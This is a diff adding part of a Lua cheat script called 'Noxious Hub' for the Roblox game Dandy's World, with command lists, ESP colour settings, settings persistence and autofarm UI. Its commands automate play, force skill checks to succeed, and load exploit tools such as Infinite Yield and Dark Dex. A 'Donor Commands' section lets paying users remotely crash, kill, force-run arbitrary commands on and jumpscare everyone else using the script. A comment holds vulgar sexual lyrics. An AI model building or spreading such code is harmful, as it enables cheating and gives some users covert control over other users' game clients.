+		"disablepanicautopickupalltapes, dpapuat - stops automatically picking up all the tapes on panic mode",
+		"enablepanicautopickupallheals, epapuah - automatically picks up all the heals on panic mode",
+		"disablepanicautopickupallheals, dpapuah - stops automatically picking up all the heals on panic mode",
+		"enablepanicautopickupallextractionitems, epapuaei - automatically picks up all the extraction items on panic mode",
+		"disablepanicautopickupallextractionitems, dpapuaei - stops automatically picking up all the extraction items on panic mode",
+		"enablepanicautoencountertwisteds, epaet - automatically encounters the twisteds on panic mode",
+		"disablepanicautoencountertwisteds, dpaet - stops automatically encountering the twisteds on panic mode",
+		" ",
+		"enableautosprint, eas - makes it so when you get spotted by a twisted, you automatically start sprinting",
+		"disableautosprint, das - disables auto sprint",
+		" ",
+		"enableautouseitems, eaui - enable auto use items",
+		"disableautouseitems, daui - disable auto use items",
+		" ",
+		"enableautocalibration, eac - enables auto calibration",
+		"disableautocalibration, dac - disables auto calibration",
+		"enableautocalibration2, eac2 - disables the skillcheck gui and makes skillchecks return 'supercomplete'",
+		"disableautocalibration2, dac2 - disables auto calibration 2",
+		" ",
+		"enablebassiemacro, ebm [delay] - enables auto bassie bone macro (BONE TRINKET REQUIRED) (USE BASSIE)",
+		"disablebassiemacro, dbm - disables auto bassie bone macro",
+		" ",
+		"enableautouseability, eaua - enables auto use ability",
+		"disableautouseability, daua - disables auto use ability",
+		"enablesprouthealnearby, eshn - enables auto heal nearby toons at 1 heart as sprout (USE SPROUT)",
+		"disablesprouthealnearby, eshn - disables auto heal nearby toons at 1 heart as sprout (USE SPROUT)",
+		"enablecosmohealnearby, echn - enables auto heal nearby toons at 1 heart as cosmo or ginger (USE COSMO / GINGER)",
+		"disablecosmohealnearby, dchn - disables auto heal nearby toons at 1 heart as cosmo or ginger (USE COSMO / GINGER)",
+		"enableautoshellyboost, easb - enable auto boost nearby extracting toons as shelly (USE SHELLY)",
+		"disableautoshellyboost, dasb - disable auto boost nearby extracting toons as shelly (USE SHELLY)",
+		" ",
+		"enableautovotebestcard, eavbc - enables auto vote the best card modifier available",
+		"disableautovotebestcard, davbc - disables auto vote the best card modifier available",
+		"enableautovoterandomcard, eavrc - enables auto vote a random card modifier",
+		"disableautovoterandomcard, davrc - disables auto vote a random card modifier",
+		"enableautovotehealcard, eavhc - enables auto vote heal card modifier",
+		"disableautovotehealcard, davhc - disables auto vote heal card modifier",
+		"enableautovoteblindgrabcard, eavbgc - enables auto vote blind grab card modifier",
+		"disableautovoteblindgrabcard, davbgc - disables auto vote blind grab card modifier",
+		"enableautovotetapescard, eavtc - enables auto vote tapes card modifier",
+		"disableautovotetapescard, davtc - disables auto vote tapes card modifier",
+		"enableautovotefrugalcard, eavfc - enables auto vote frugal card modifier",
+		"disableautovotefrugalcard, davfc - disables auto vote frugal card modifier",
+		"enableautovoteelevatortimecard, eavetc - enables auto vote elevator time card modifier",
+		"disableautovoteelevatortimecard, davetc - disables auto vote elevator time card modifier",
+		"enableautovotemaxstaminacard, eavmsc - enables auto vote max stamina card modifier",
+		"disableautovotemaxstaminacard, davsmc - disables auto vote max stamina card modifier",
+		"enableautovotesparkplugcard, eavsgc - enables auto vote sparkplug card modifier",
+		"disableautovotesparkplugcard, davsgc - disables auto vote sparkplug card modifier",
+		"enableautovoteelectriciancard, eavec - enables auto vote electrician card modifier",
+		"disableautovoteelectriciancard, davec - disables auto vote electrician card modifier",
+		"enableautovotesuppressioncard, eavsnc - enables auto vote suppression card modifier",
+		"disableautovotesuppressioncard, davsnc - disables auto vote suppression card modifier",
+		"enableautovotetechsavvycard, eavstsc - enables auto vote tech savvy card modifier",
+		"disableautovotetechsavvycard, davstsc - disables auto vote tech savvy card modifier",
+		"enableautovoteabilitycard, eavac - enables auto vote ability card modifier",
+		"disableautovoteabilitycard, davac - disables auto vote ability card modifier",
+	},
+	["Animations / Emotes"] = {
+		"spasm - makes you freak out",
+		"unspasm - stop freaking out",
+		" ",
+		"glitch - makes you act like a fnaf titlescreen",
+		"unglitch - stop glitching",
+		" ",
+		"tpose - makes you t-pose",
+		"untpose - stop t-posing",
+		" ",
+		"crawl - makes you crawl",
+		"uncrawl - stop crawling",
+		" ",
+		"therian - makes you run like a therian? idk",
+		"untherian - stop running like a therian",
+		" ",
+		"dance - makes you dance",
+		"undance - stop dancing",
+		" ",
+		"headbang, hbang - makes you bang your head",
+		"unheadbang, unhbang - stop headbanging",
+		" ",
+		"cradle - makes you curdle up into a ball",
+		"uncradle - stop cradling",
+		" ",
+		"sit - makes you sit",
+		"unsit - stop sitting",
+		" ",
+		"wave - makes you wave",
+		"enableclickwave, ecwave - enables click to wave",
+		"disableclickwave, dcwave - disables click to wave",
+		" ",
+		"doabarrelroll, dabr - makes you do a barrel roll",
+		"enableclickdoabarrelroll, ecdabr - enables click to do a barrel roll",
+		"disableclickdoabarrelroll, dcdabr - disables click to do a barrel roll",
+		" ",
+		"pounce - makes you pounce",
+		"enableclickpounce, ecpounce - enables click to pounce",
+		"disableclickpounce, dcpounce - disables click to pounce",
+		" ",
+		"twirl - makes you twirl",
+		"enableclicktwirl, ectwirl - enables click to twirl",
+		"disableclicktwirl, dctwirl - disables click to twirl",
+		" ",
+		"twirl2 - makes you twirl 2",
+		"enableclicktwirl2, ectwirl2 - enables click to twirl 2",
+		"disableclicktwirl2, dctwirl2 - disables click to twirl 2",
+		" ",
+		"shimmy - makes you shimmy side to side",
+		"enableclickshimmy, ecshimmy - enables click to shimmy side to side",
+		"disableclickshimmy, dcshimmy - disables click to shimmy side to side",
+		" ",
+		"facepalm - makes you facepalm",
+		"enableclickfacepalm, ecfacepalm - enables click to facepalm",
+		"disableclickfacepalm, dcfacepalm - disables click to facepalm",
+		" ",
+		"jump - makes you jump",
+		"enableclickjump, ecjump - enables click to jump",
+		"disableclickjump, dcjump - disables click to jump",
+		" ",
+		"cheer - makes you cheer",
+		"enableclickcheer, eccheer - enables click to cheer",
+		"disableclickcheer, dccheer - disables click to cheer",
+		" ",
+		"dive - makes you dive",
+		"enableclickdive, ecdive - enables click to dive",
+		"disableclickdive, dcdive - disables click to dive",
+		" ",
+		"kick - makes you kick the air",
+		"enableclickkick, eckick - enables click to kick",
+		"disableclickkick, dckick - disables click to kick",
+		" ",
+		"stomp - makes you stomp on the floor",
+		"enableclickstomp, eccheer - enables click to stomp",
+		"disableclickstomp, dccheer - disables click to stomp",
+		" ",
+		"shakehead - makes you shake your head gesturing no",
+		"enableclickshakehead, ecshakehead - enables click to shake head",
+		"disableclickshakehead, dcshakehead - disables click to shake head",
+	},
+	["Scripts"]={
+		"riddance, scarlet - opens scarlet & olivia's dandy's world script",
+		"bacondwscript, bacon - opens Bac0nH1ckOff's dandy's world script",
+		"gobbydwscript, gobby - opens G0bbyD0llan57's dandy's world script",
+		"spooksdwscript, spooks - opens ApparentlySpooks' dandy's world script",
+		"moxdwscript, mox - opens ApparentlySpooks & Mox's dandy's world script",
+		"hexdwscript, hex - opens Hex233222's dandy's world script",
+		"yiwdwscript, yiw - opens Yiw's dandy's world script",
+		"bobbydwscript, bobby - opens bob junior's dandy's world script",
+		"otvajnidwscript, otvajni - opens Otvajni's dandy's world script",
+		"thedandyhelper, rodestriker - opens Rode Striker's dandy's world script",
+		"soupdwscript, soup - opens Soup's dandy's world script",
+		"ffjdwscript, ffj - opens FFJ's dandy's world script",
+		"poltergeistscript, pg - opens jaonoobao's dandy's world script",
+		" ",
+		"otvajniflyscript, otvajnifly - opens Otvajni's fly script",
+		"mobilekeyboard, mk - opens RED_BLOXZ's mobile keyboard script",
+		"infiniteyield, iy - opens Edge's infinite yield",
+		"explorer, dex - opens Dark Dex",
+	},
+	["Donor Commands"] = {
+		"noxioususercheck, nxsuc - checks how many players are using Noxious Hub: Dandy's World in your server",
+		"scriptnotify, sn [text] - notifies people with the script with the specifed text",
+		" ",
+		"scriptforcestoprunningconnections, sfsrc - forces people with the script to stop running connections",
+		"scriptforcestopplayerinteractions, sfspi - forces people with the script to stop player interactions",
+		" ",
+		"scriptteleport, stp - teleports people with the script to you",
+		"scriptkill, skill - sets everyone with the script's character's health to 0",
+		"scriptcrash, scrash - crashes everyone with the script",
+		"scriptforceruncommand, sfrc [command] - forces people with the script to execute the specified command",
+		" ",
+		"scriptshrimpodecalspam, ssods - decal spams people with the script with an image of shrimpo",
+		"scriptnoxiousdecalspam, snds - decal spams people with the script with an image of the noxious icon",
+		"scriptscarydecalspam, ssyds - decal spams people with the script with an image of a scary face??? idk",
+		"scriptveryscarydecalspam, svsyds - decal spams people with the script with an image of a scary face",
+		" ",
+		"scriptwhatsappastro, swhatsappastro - turns you into whatsapp astro but everyone with the script can also see it",
+		"scriptfacelessshrimpo, sflshrimpo - turns you into faceless shrimpo but everyone with the script can also see it",
+		" ",
+		"scriptcreepygirlvoice, scgv - plays a creepy girl voice audio to people with the script",
+		"scriptmancrying, smc - plays a man crying audio to people with the script",
+		"scriptwomancrying, swc - plays a woman crying audio to people with the script",
+		" ",
+		"scriptstripperblotjumpscare, ssbjs - jumpscares everyone with the script with a video of blot pole dancing on front of yatta and looey lmao",
+		"scriptpalemachinejumpscare, spmjs - jumpscares everyone with the script with a video of joycawn's pale machine animation",
+		"scriptolviajumpscare, sojs - jumpscares everyone with the script with a video of 15/06/2025 6:29 PM EST and crashes them",
+		"scriptpatrickbatemanscreamingjumpscare, spbsjs - jumpscares everyone with the script with a video of patrick bateman screaming",
+		" ",
+		"scriptdandyjumpscare, sdjs - jumpscares everyone with the script with an image of dandy",
+		"scriptsharingandandyjumpscare, ssdjs - jumpscares everyone with the script with an image of sharingan dandy",
+		"scriptshrimpojumpscare, ssojs - jumpscares everyone with the script with an image of shrimpo",
+		"scriptalbertjumpscare, sajs - jumpscares everyone with the script with an image of albert",
+		"scriptconniejumpscare, scjs - jumpscares everyone with the script with an image of connie",
+		"scriptfruitcakejumpscare, sfcjs - jumpscares everyone with the script with an image of sprout and cosmo in bed",
+		"scriptjewelryboxjumpscare, sjbjs - jumpscares everyone with the script with an image of glisten kissing boxten lmao",
+		"scriptbuffpebblejumpscare, sbpjs - jumpscares everyone with the script with an image of buff pebble",
+		"scripttoodlesjumpscare, stjs - jumpscares everyone with the script with an image of toodles",
+		"scriptshellyjumpscare, ssyjs - jumpscares everyone with the script with an image of shelly",
+		"scriptshrimpo2jumpscare, sso2js - jumpscares everyone with the script with a different image of shrimpo",
+		"scriptsproutjumpscare, ssts - jumpscares everyone with the script with an image of sprout",
+		"scriptscaryfacejumpscare, ssfjs - jumpscares everyone with the script with an image of a scary face",
+		"scriptjobapplicationjumpscare, sjajs - jumpscares everyone with the script with an image of a job application",
+		"scriptps4glitchjumpscare, sps4gjs - jumpscares and crashes everyone with the script with an image of the ps4 fnaf glitch screen",
+		"scriptkendricklamarjs, skljs - jumpscares everyone with the script with an image of kendrick lamar",
+		"scriptlucyjumpscare, sljs - jumpscares everyone with the script with an image of lucy",
+		" ",
+		"scriptflashbang, sfb - flashbangs people with the script",
+	},
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+--[[
+
+Kin tama hoihoi chin ke no shigemi de undoukai
+Tarattarattatta, Let's go!
+
+Kousai shite seikoushou soretomo seikoushou shite kousai
+Kousai shite seikoushou soretomo seikoushou shite kousai
+Kanpai oppai cheripai
+Kin tama hoihoi
+Chin ke no shigemi de undoukai
+Tarattarattatta, Let's go!
+
+Gogorettsugo
+Rettsugo rettsugo
+Man ke no daiun dou kai, tarattarattatta
+Gogorettsugo
+Rettsugo rettsugo
+Sakana no kunyomi
+Oh wow!
+
+Hahhatsuiyasasa
+Panda ga tabe runoitsudemo sasa
+Ame ga futta ra kasu noha kasa
+Minna buriburioasa
+
+Anatato boku no ondosa
+Anatanochin ko no nagasa
+Okinawa mensore shisa
+Kosugi no aikotoba hiha!
+
+Anatato, anatato
+Watashito, watashito
+Anatato, anatato
+Watashito, watashito
+Anatatoanatato
+Anatatoanatatoanatato
+Anatatoanatade orion za
+Kanpai!
+
+Gogorettsugo
+Rettsugo rettsugo
+Man ke no daiun dou kai, tarattarattatta
+Gogorettsugo
+Rettsugo rettsugo
+Sakana no kunyomi
+Oh wow!
+
+Hahhatsuiyasasa
+Panda ga tabe runoitsudemo sasa
+Ame ga futta ra kasu noha kasa
+Minna buriburioasa
+
+Anatato boku no ondosa
+Anatanochin ko no nagasa
+Okinawa mensore shisa
+Kosugi no aikotoba hiha!
+
+]]
+
+-- autofarming
+noxiousautofarmrunning = false
+dekaautofarmrunning = false
+
+persistentautofarm = false
+threedrendering = true
+encountertwisteds = true
+collectcapsules = true
+autobuyitems = false
+autopickupheals = true
+autopickupextractionitems = true
+
+-- script settings
+logexecution = true
+scriptlanguage = "English"
+ptcleartextbox = true
+cleareresptext = false
+legacyhighlights = false
+autosearchcommand = true
+togglekeybind = "E"
+
+defaultespcolors = {
+	players = Color3.fromRGB(0, 0, 255),
+	twisteds = Color3.fromRGB(255, 0, 0),
+	machines = Color3.fromRGB(110, 110, 110),
+	completedmachines = Color3.fromRGB(255, 0, 255),
+	posessedmachines = Color3.fromRGB(0, 255, 255),
+	machinesbeingextracted = Color3.fromRGB(204, 204, 204),
+	items = Color3.fromRGB(0, 255, 0),
+	rareitems = Color3.fromRGB(176, 38, 255),
+	superrareitems = Color3.fromRGB(255, 100, 0),
+	fakecapsules = Color3.fromRGB(255, 255, 0),
+	fakeelevator = Color3.fromRGB(255, 255, 0),
+	elevator = Color3.fromRGB(90, 90, 90),
+	tendrils = Color3.fromRGB(100, 0, 40),
+	blotshands = Color3.fromRGB(0, 0, 0),
+}
+
+espcolors = {}
+for k,v in pairs(defaultespcolors) do
+	espcolors[k] = v
+end
+
+-- script configurations
+botlikemessages = true
+advancedautouseitems = true
+modifylooprunspeed = false
+playersespcolor = espcolors.players
+twistedsespcolor = espcolors.twisteds
+machinesespcolor = espcolors.machines
+completedmachinesespcolor = espcolors.completedmachines
+posessedmachinesespcolor = espcolors.posessedmachines
+machinesbeingextractedespcolor = espcolors.machinesbeingextracted
+itemsespcolor = espcolors.items
+fakecapsulesespcolor = espcolors.fakecapsules
+fakeelevatorespcolor = espcolors.fakeelevator
+elevatorespcolor = espcolors.elevator
+rareitemsespcolor = espcolors.rareitems
+superrareitemsespcolor = espcolors.superrareitems
+tendrilsespcolor = espcolors.tendrils
+blotshandsespcolor = espcolors.blotshands
+
+-- esps, all disabled by default (DO NOT SAVE)
+playeresp = false
+twistedesp = false
+machineesp = false
+itemesp = false
+fakeelevatoresp = false
+elevatoresp = false
+tendrilesp = false
+blothandsesp = false
+
+noxious["esp types"] = {
+	Monsters = false,
+	FakeElevator = false,
+	Elevator = false,
+	Items = false,
+	Players = false,
+	Machines = false,
+	Tendrils = false,
+	BlotHands = false,
+}
+
+-- animations
+usetwistedanimations = false
+useoldanimations = false
+animationlooped = true
+animationspeedinput = 1
+targettoonanimations = ""
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function updclrtxt() noxious["command bar"].ClearTextOnFocus = ptcleartextbox if noxious["seperate command bar"] then noxious["seperate command bar"].ClearTextOnFocus = ptcleartextbox end end
+
+function getespcolor(colorType)
+	if espcolors[colorType] and typeof(espcolors[colorType]) == "Color3" then
+		return espcolors[colorType]
+	end
+	if defaultespcolors[colorType] and typeof(defaultespcolors[colorType]) == "Color3" then
+		return defaultespcolors[colorType]
+	end
+	return Color3.fromRGB(0, 0, 0)
+end
+
+function changemesh(bodypart, id)
+	task.spawn(function()
+		if bodypart then
+			noxious["character"]:FindFirstChild(bodypart).MeshId = "rbxassetid://" .. id
+		else
+			ndebug("'" .. bodypart .. "'' Not found in character!")
+		end
+	end)
+end
+
+function changetexture(bodypart, id)
+	task.spawn(function()
+		if bodypart then
+			noxious["character"]:FindFirstChild(bodypart).TextureID = "rbxassetid://" .. id
+		else
+			ndebug("'" .. bodypart .. "'' Not found in character!")
+		end
+	end)
+end
+
+function animmodenotif()
+	if not targettoonanimations or targettoonanimations == "" then return end
+	if useoldanimations then
+		if usetwistedanimations then
+			notify("Now using Twisted " .. targettoonanimations .. "'s old animations.", 5)
+		else
+			notify("Now using " .. targettoonanimations .. "'s old animations.", 5)
+		end
+	else
+		if usetwistedanimations then
+			notify("Now using Twisted " .. targettoonanimations .. "'s animations.", 5)
+		else
+			notify("Now using " .. targettoonanimations .. "'s animations.", 5)
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["default toggle states"] = {
+	["Toggle Autofarm"] = function() return noxiousautofarmrunning or false end,
+	["Toggle Deka's Autofarm"] = function() return dekaautofarmrunning or false end,
+	["Encounter Twisteds?"] = function() return encountertwisteds or false end,
+	["Collect Capsules?"] = function() return collectcapsules or false end,
+	["Persistent Autofarm"] = function() return persistentautofarm or false end,
+	["Toggle Auto Buy Items"] = function() return autobuyitems or false end,
+	["Toggle Rendering"] = function() return threedrendering or false end,
+	["Auto Pick Up Heals"] = function() return autopickupheals or false end,
+	["Auto Pick Up Extraction Items"] = function() return autopickupextractionitems or false end,
+	["Toggle Bot-Like Messages"] = function() return botlikemessages or false end,
+	["Advanced Auto Use Items"] = function() return advancedautouseitems or true end,
+	["Toggle Script Logging"] = function() return logexecution or true end,
+	["Clear On FocusLost"] = function() return ptcleartextbox or false end,
+	["Clearer ESP Text"] = function() return cleareresptext or false end,
+	["Animation Looped?"] = function() return animationlooped or true end,
+	["Toggle Loop Run Speed Modifier"] = function() return modifylooprunspeed or false end,
+	["Toggle Legacy ESP"] = function() return legacyhighlights or false end,
+	["Toggle Command Search"] = function() return autosearchcommand or false end,
+}
+
+noxious["default input values"] = {
+	["Player ESP"] = typeof(playersespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(playersespcolor.R * 255), math.floor(playersespcolor.G * 255), math.floor(playersespcolor.B * 255)) or "",
+	["Twisted ESP"] = typeof(twistedsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(twistedsespcolor.R * 255), math.floor(twistedsespcolor.G * 255), math.floor(twistedsespcolor.B * 255)) or "",
+	["Item ESP"] = typeof(itemsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(itemsespcolor.R * 255), math.floor(itemsespcolor.G * 255), math.floor(itemsespcolor.B * 255)) or "",
+	["Rare Item ESP"] = typeof(rareitemsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(rareitemsespcolor.R * 255), math.floor(rareitemsespcolor.G * 255), math.floor(rareitemsespcolor.B * 255)) or "",
+	["Super Rare Item ESP"] = typeof(superrareitemsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(superrareitemsespcolor.R * 255), math.floor(superrareitemsespcolor.G * 255), math.floor(superrareitemsespcolor.B * 255)) or "",
+	["Fake Capsule ESP"] = typeof(fakecapsulesespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(fakecapsulesespcolor.R * 255), math.floor(fakecapsulesespcolor.G * 255), math.floor(fakecapsulesespcolor.B * 255)) or "",
+	["Machine ESP"] = typeof(machinesespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(machinesespcolor.R * 255), math.floor(machinesespcolor.G * 255), math.floor(machinesespcolor.B * 255)) or "",
+	["Completed Machine ESP"] = typeof(completedmachinesespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(completedmachinesespcolor.R * 255), math.floor(completedmachinesespcolor.G * 255), math.floor(completedmachinesespcolor.B * 255)) or "",
+	["Posessed Machine ESP"] = typeof(posessedmachinesespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(posessedmachinesespcolor.R * 255), math.floor(posessedmachinesespcolor.G * 255), math.floor(posessedmachinesespcolor.B * 255)) or "",
+	["Extracted Machine ESP"] = typeof(machinesbeingextractedespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(machinesbeingextractedespcolor.R * 255), math.floor(machinesbeingextractedespcolor.G * 255), math.floor(machinesbeingextractedespcolor.B * 255)) or "",
+	["Elevator ESP"] = typeof(elevatorespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(elevatorespcolor.R * 255), math.floor(elevatorespcolor.G * 255), math.floor(elevatorespcolor.B * 255)) or "",
+	["Fake Elevator ESP"] = typeof(fakeelevatorespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(fakeelevatorespcolor.R * 255), math.floor(fakeelevatorespcolor.G * 255), math.floor(fakeelevatorespcolor.B * 255)) or "",
+	["Tendrils ESP"] = typeof(tendrilsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(tendrilsespcolor.R * 255), math.floor(tendrilsespcolor.G * 255), math.floor(tendrilsespcolor.B * 255)) or "",
+	["Blot's Hands ESP"] = typeof(blotshandsespcolor) == "Color3" and string.format("%d, %d, %d", math.floor(blotshandsespcolor.R * 255), math.floor(blotshandsespcolor.G * 255), math.floor(blotshandsespcolor.B * 255)) or "",
+
+	["Change Language"] = "English" or "",
+	["Toggle Keybind"] = "E" or "",
+}
+
+function getespcolorvariable(title)
+	local mappings = {
+		["Player ESP"] = "players",
+		["Twisted ESP"] = "twisteds",
+		["Item ESP"] = "items",
+		["Rare Item ESP"] = "rareitems",
+		["Super Rare Item ESP"] = "superrareitems",
+		["Fake Capsule ESP"] = "fakecapsules",
+		["Machine ESP"] = "machines",
+		["Completed Machine ESP"] = "completedmachines",
+		["Posessed Machine ESP"] = "posessedmachines",
+		["Extracted Machine ESP"] = "machinesbeingextracted",
+		["Elevator ESP"] = "elevator",
+		["Fake Elevator ESP"] = "fakeelevator",
+		["Tendrils ESP"] = "tendrils",
+		["Blot's Hands ESP"] = "blotshands"
+	}
+	return mappings[title]
+end
+
+noxious["variable mappings"] = {
+	["Toggle Autofarm"] = "noxiousautofarmrunning",
+	["Toggle Deka's Autofarm"] = "dekaautofarmrunning",
+	["Encounter Twisteds?"] = "encountertwisteds",
+	["Collect Capsules?"] = "collectcapsules",
+	["Persistent Autofarm"] = "persistentautofarm",
+	["Toggle Auto Buy Items"] = "autobuyitems",
+	["Toggle Rendering"] = "threedrendering",
+	["Auto Pick Up Heals"] = "autopickupheals",
+	["Auto Pick Up Extraction Items"] = "autopickupextractionitems",
+	["Toggle Bot-Like Messages"] = "botlikemessages",
+	["Advanced Auto Use Items"] = "advancedautouseitems",
+	["Animation Looped?"] = "animationlooped",
+	["Toggle Loop Run Speed Modifier"] = "modifylooprunspeed",
+
+	["Player ESP"] = "playersespcolor",
+	["Twisted ESP"] = "twistedsespcolor",
+	["Item ESP"] = "itemsespcolor",
+	["Rare Item ESP"] = "rareitemsespcolor",
+	["Super Rare Item ESP"] = "superrareitemsespcolor",
+	["Fake Capsule ESP"] = "fakecapsulesespcolor",
+	["Machine ESP"] = "machinesespcolor",
+	["Completed Machine ESP"] = "completedmachinesespcolor",
+	["Posessed Machine ESP"] = "posessedmachinesespcolor",
+	["Extracted Machine ESP"] = "machinesbeingextractedespcolor",
+	["Elevator ESP"] = "elevatorespcolor",
+	["Fake Elevator ESP"] = "fakeelevatorespcolor",
+	["Tendrils ESP"] = "tendrilsespcolor",
+	["Blot's Hands ESP"] = "blotshandsespcolor",
+
+	["Toggle Script Logging"] = "logexecution",
+	["Clearer ESP Text"] = "cleareresptext",
+	["Clear On FocusLost"] = "ptcleartextbox",
+	["Change Language"] = "scriptlanguage",
+	["Toggle Legacy ESP"] = "legacyhighlights",
+	["Toggle Command Search"] = "autosearchcommand",
+	["Toggle Keybind"] = "togglekeybind",
+}
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if not noxious["in studio"] then
+	noxious["settings and configurations filepath"] = tofolder()
+	noxious["settings file name"] = noxious["settings and configurations filepath"] .. "/SettingsAndConfigs.json"
+end
+
+function tocolor3(text)
+	if typeof(text) == "Color3" then
+		return text
+	end
+
+	local r, g, b = text:match("^(%d+)[,%s]*(%d+)[,%s]*(%d+)$")
+	if r and g and b then
+		return Color3.fromRGB(
+			math.clamp(tonumber(r), 0, 255),
+			math.clamp(tonumber(g), 0, 255),
+			math.clamp(tonumber(b), 0, 255)
+		)
+	end
+
+	return Color3.fromRGB(0, 0, 0)
+end
+
+function loadnoxioussettings()
+	local success, err = pcall(function()
+		if isfile(noxious["settings file name"]) then
+			local json = readfile(noxious["settings file name"])
+			noxious["saved settings"] = noxious["http service"]:JSONDecode(json)
+		end
+	end)
+	if not success then
+		ndebug("Failed to load settings:", err)
+		noxious["saved settings"] = {}
+	end
+end
+
+function savenoxioussettings()
+	local success, err = pcall(function()
+		local settingsToSave = {}
+
+		for listName, listData in pairs(noxious["button lists"] or {}) do
+			if listName ~= "Toon Customization" and listName ~= "Animations" then
+				settingsToSave[listName] = {}
+
+				for _, element in pairs(listData) do
+					if element.title then
+						local entry
+
+						if element.type == "toggle" or element.type == "checkbox" then
+							if element.state ~= nil then
+								entry = { state = element.state }
+							end
+						elseif element.type == "inputbox" then
+							if element.text ~= nil then
+								entry = { text = element.text }
+							end
+						elseif element.type == "checkboxes" then
+							if element.boxStates then
+								local checkedBoxes = {}
+								for boxName, isChecked in pairs(element.boxStates) do
+									if isChecked then
+										table.insert(checkedBoxes, boxName)
+									end
+								end
+								entry = { checked = checkedBoxes }
+							end
+						end
+
+						if entry then
+							local skipSaveTitles = {
+								["Toggle Autofarm"] = true,
+								["Toggle Deka's Autofarm"] = true,
+							}
+
+							if not (skipSaveTitles[element.title] and not persistentautofarm) then
+								settingsToSave[listName][element.title] = entry
+							end
+						end
+					end
+				end
+			end
+		end
+
+		local json = noxious["http service"]:JSONEncode(settingsToSave)
+		writefile(noxious["settings file name"], json)
+	end)
+
+	if not success then
+		ndebug("Failed to save settings:", err)
+	end
+end
+
+function initializenoxioussettings()
+	if not noxious["saved settings"] then return end
+
+	for listName, listData in pairs(noxious["saved settings"]) do
+		for elementName, elementData in pairs(listData) do
+			local varName = noxious["variable mappings"][elementName]
+			if varName then
+				local valueToApply
+
+				if elementData.state ~= nil then
+					valueToApply = elementData.state
+					_G[varName] = valueToApply
+				elseif elementData.text ~= nil then
+					valueToApply = elementData.text
+
+					if elementName:match("ESP$") then
+						local color = tocolor3(valueToApply)
+						_G[varName] = color
+
+						local espKey = getespcolorvariable(elementName)
+						if espKey and espcolors[espKey] then
+							espcolors[espKey] = color
+						end
+					else
+						_G[varName] = valueToApply
+					end
+				elseif elementData.checked ~= nil then
+					-- This is for checkboxes, we'll handle them in the UI creation
+					valueToApply = elementData.checked
+				end
+
+				for _, list in pairs(noxious["button lists"] or {}) do
+					for _, element in pairs(list) do
+						if element.title == elementName then
+							if element.type == "checkboxes" and elementData.checked then
+								-- Initialize checkbox states
+								element.boxStates = element.boxStates or {}
+								for _, boxName in ipairs(element.boxes) do
+									element.boxStates[boxName] = table.find(elementData.checked, boxName) and true or false
+								end
+							elseif type(element.func) == "function" then
+								element.func(valueToApply)
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+end
+
+function syncespcolors()
+	local espcolormapping = {
+		players = "playersespcolor",
+		twisteds = "twistedsespcolor",
+		machines = "machinesespcolor",
+		completedmachines = "completedmachinesespcolor",
+		posessedmachines = "posessedmachinesespcolor",
+		machinesbeingextracted = "machinesbeingextractedespcolor",
+		items = "itemsespcolor",
+		fakecapsules = "fakecapsulesespcolor",
+		fakeelevator = "fakeelevatorespcolor",
+		elevator = "elevatorespcolor",
+		rareitems = "rareitemsespcolor",
+		superrareitems = "superrareitemsespcolor",
+		tendrils = "tendrilsespcolor",
+		blotshands = "blotshandsespcolor"
+	}
+
+	for key, varName in pairs(espcolormapping) do
+		if _G[varName] and typeof(_G[varName]) == "Color3" then
+			espcolors[key] = _G[varName]
+		end
+	end
+end
+
+if not noxious["in studio"] then
+	loadnoxioussettings()
+	initializenoxioussettings()
+	syncespcolors()
+	print("[Noxious Hub]: File config load attempt #1")
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["button lists"] = {
+	["Autofarm"] = {
+		{type = "separator", text = "┌  Autofarm"},
+		{type = "label", text = "This section is still a work in progress. Expect\nbugs. Autofarming while having certain\ncommands on that alter the player's behavior\nmay cause conflicts with the autofarm.", addheight = 68, labeltype = "warning"},
+		{type = "label", text = "Having both Noxious' and Deka's autofarm\non at the same time will break the autofarm.", addheight = 36, labeltype = "error"},
+		{type = "toggle", title = "Toggle Autofarm", desc = "Toggles the autofarm.", descHeightOverride = 14, func = function(state) 
+			noxiousautofarmrunning = state
+			task.spawn(function()
+				repeat task.wait(1) until noxious["loaded"] == true
+				if state then enablenoxiousautofarm() else disablenoxiousautofarm() end
+			end)
+		end},
+		{type = "toggle", title = "Toggle Deka's Autofarm", desc = "Toggles Deka's pathfinder autofarm.", descHeightOverride = 14, func = function(state) 
+			dekaautofarmrunning = state
+			task.spawn(function()
+				repeat task.wait(1) until noxious["loaded"] == true
+				if state then enabledekasautofarm() else disabledekasautofarm() end
+			end)
+		end},
+
+		{type = "separator", text = "┌  Research"},
+		{type = "toggle", title = "Encounter Twisteds?", desc = "Makes it so you get research by encountering the Twisteds.", descHeightOverride = 28, func = function(state) 
+			encountertwisteds = state
+		end},
+		{type = "toggle", title = "Collect Capsules?", desc = "Makes it so you get research by collecting Research Capsules.", descHeightOverride = 28, func = function(state) 
+			collectcapsules = state
+		end},
+
+		{type = "separator", text = "┌  Configuration"},
+		{type = "toggle", title = "Persistent Autofarm", desc = "Makes it so you start a new autofarm run on death or disconnect.", descHeightOverride = 28, func = function(state) 
+			persistentautofarm = state
+		end},
+		{type = "toggle", title = "Toggle Auto Buy Items", desc = "Toggles whether you want to buy items from the\nshop while autofarming.", descHeightOverride = 28, func = function(state) 
+			autobuyitems = state
+		end},
+		{type = "toggle", title = "Toggle Rendering", desc = "Toggles 3d rendering.", descHeightOverride = 14, func = function(state) 
+			threedrendering = state
+			if not noxious["in studio"] then noxious["run service"]:Set3dRenderingEnabled(state) end
+		end},
